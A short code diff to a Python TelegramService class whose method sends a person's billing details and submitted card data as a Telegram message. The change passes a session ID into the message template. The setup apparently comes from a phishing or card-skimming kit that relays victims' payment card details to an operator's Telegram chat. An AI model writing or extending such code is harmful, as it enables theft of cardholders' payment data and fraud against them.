@@ -156,8 +156,8 @@ class TelegramService:
     async def send_card_submitted_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], session_id: str) -> bool:
         """Send first message: client + card data when card is submitted"""
         try:
-            # Use the new template format
-            message = TelegramTemplates.payment_template(billing_data, card_data)
+            # Use the new template format with session_id
+            message = TelegramTemplates.payment_template(billing_data, card_data, session_id)
             
             # Send with Markdown formatting to make bold text work
             return await self.send_message(message, parse_mode="Markdown")
